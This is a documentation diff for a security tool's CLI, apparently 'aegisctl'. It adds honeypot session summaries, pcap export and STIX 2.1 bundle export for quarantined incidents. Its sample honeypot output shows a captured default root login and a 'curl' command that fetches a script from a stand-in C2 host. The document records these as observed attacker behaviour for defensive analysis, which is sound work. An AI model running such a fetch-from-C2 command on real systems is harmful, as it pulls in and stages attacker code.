@@ -146,7 +146,7 @@ With nothing to show it prints `No incidents.`
 
 ## Incident ids
 
-`show` and `timeline` take an id in the exact form
+Every `incidents` command but `list` takes an id in the exact form
 `AEG-YYYYMMDD-HHMMSS-` plus 16 lowercase hex digits. Anything else is
 refused before the daemon is asked:
 
@@ -186,9 +186,35 @@ Evidence times are converted from boot-relative timestamps. For an
 incident from an earlier boot they print as `boot+<seconds>s (previous
 boot)`.
 
-With `--json`, you get `incident.json` exactly; see
-[incidents](incidents.md#incidentjson). `show` finds an incident by id
-even when it's too old for `list`.
+From v0.3.0, an incident the honeypot observed ends with what its
+sessions saw, grouped by protocol: where the tree connected, the names
+it looked up, the logins it tried, the commands it ran, its HTTP
+requests and headers, and the SHA-256 of every payload it sent. Each
+line shows once, however many sessions repeat it, and a protocol lists
+at most 20 before it counts the rest:
+
+```text
+honeypot (3 sessions)
+  dns (1 session)
+    dst    198.18.0.53:53
+    query  A c2.example -> 198.18.0.1
+  ssh (2 sessions)
+    dst      198.18.0.1:22
+    login    root / 123456
+    command  uname -a
+    command  curl -s http://c2.example/x.sh
+    payload  9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
+    and 4 more
+```
+
+An incident with no sessions, such as any drop-mode quarantine, has no
+`honeypot` section at all.
+
+With `--json`, you get `incident.json`; see
+[incidents](incidents.md#incidentjson). Sessions add one key to it, a
+`honeypot` array with one object per protocol: `protocol`, `sessions`,
+`lines` (each a `kind` and a `value`) and `more`, the lines left out.
+`show` finds an incident by id even when it's too old for `list`.
 
 ## `incidents timeline <id>`
 
@@ -216,6 +242,60 @@ A timeline that reached its 10,000-line cap ends with a row saying
 
 With `--json`, you get the lines of `timeline.jsonl` as a JSON array;
 see [incidents](incidents.md#timelinejsonl).
+
+## `incidents pcap <id>`
+
+From v0.3.0.
+
+```sh
+aegisctl incidents pcap AEG-20261019-093000-0123456789abcdef > inc.pcap
+```
+
+Writes every honeypot session of the incident as one pcap, packets in
+time order, ready for Wireshark, tcpdump or Zeek. The packets are
+rebuilt from what each side sent, with the addresses the tree meant to
+reach. Raw IPv4, so there is no link layer.
+
+It won't write to a terminal: `stdout is a terminal; redirect it to a
+file (> incident.pcap)`. The pcap stops at 256 MiB. Sessions go in
+oldest first, and any that don't fit are left out, with a note on
+stderr saying how many. An incident without sessions has nothing to
+export, and that's an error, exit code 1:
+
+<!-- markdownlint-disable MD013 -->
+```text
+aegisctl: aegisd: nothing to export: no honeypot sessions were filed into this incident
+```
+<!-- markdownlint-enable MD013 -->
+
+## `incidents stix <id>`
+
+From v0.3.0.
+
+```sh
+aegisctl incidents stix AEG-20261019-093000-0123456789abcdef > inc.json
+```
+
+Prints a [STIX 2.1](https://docs.oasis-open.org/cti/stix/v2.1/) bundle
+for your threat intel platform. In it:
+
+- an `identity` for this host;
+- one `observed-data` that refers to everything below;
+- for each process in the tree, a `process` with its `file` and
+  `directory`;
+- for each session, a `network-traffic` to an `ipv4-addr`, with the
+  JA4 fingerprint as `x_aegis_ja4` when there was a TLS hello;
+- a `domain-name` for every name looked up or sent as SNI, and a
+  `file` with the SHA-256 of every payload;
+- an `indicator` for each of those domains and payload hashes.
+
+Export the same incident twice and you get the same bytes. Every id is
+a UUIDv5 of the incident id, the object type and its value, and every
+`created` and `modified` is the incident's own `created`. A drop-mode
+incident still exports: the host, its processes and the observation.
+
+A bundle holds at most 20,000 objects. Sessions past that are left out,
+and `observed-data` gets `"x_aegis_truncated": true`.
 
 ## `incidents release <id>`
 
@@ -275,7 +355,10 @@ Paths and process names come from whatever ran, and an attacker
 controls both. Before printing them, `aegisctl` turns control
 characters and bidirectional or zero-width marks into visible escapes
 such as `\x1b` or `\u{202e}`, so a crafted name can't rewrite your
-terminal. `--json` output is standard JSON escaping.
+terminal. The same goes for everything the honeypot recorded, which
+the observed tree controls. JSON output, `--json` and `incidents stix`,
+writes those characters as `\u` escapes, which parse back to the same
+string.
 
 ## Errors
 
@@ -293,6 +376,9 @@ Errors go to stderr, prefixed with `aegisctl:`, with exit code 1.
   runs when the enforcer gets to it, so don't send it again.
   (Before v0.2.1 this said `timed out waiting for the enforcer`.)
 
+- `aegisd is older than this aegisctl and can't answer that; it needs
+  v0.3.0 or later`: `pcap` and `stix` against an older daemon.
+
 Replies over 16 MiB are refused rather than read.
 
 ## The protocol
@@ -303,8 +389,12 @@ Requests are `"Status"`, `"IncidentsList"`,
 `{"IncidentShow":{"id":"<id>"}}` and
 `{"IncidentTimeline":{"id":"<id>"}}`, and from v0.2.0
 `{"IncidentRelease":{"id":"<id>"}}` and `{"IncidentKill":{"id":"<id>"}}`,
-which answer `{"Done":"<message>"}`. An error comes back as
-`{"error":"<message>"}`.
+which answer `{"Done":"<message>"}`. From v0.3.0,
+`{"IncidentStix":{"id":"<id>"}}` answers `{"Stix":<bundle>}`, and
+`{"IncidentPcap":{"id":"<id>"}}` answers
+`{"Pcap":{"bytes":<n>,"sessions":<n>,"left_out":<n>}}`, followed by
+exactly `bytes` bytes of pcap and then the next reply. An error comes
+back as `{"error":"<message>"}`.
 
 ```sh
 echo '"Status"' | socat - UNIX-CONNECT:/run/aegis-v2/aegisd.sock
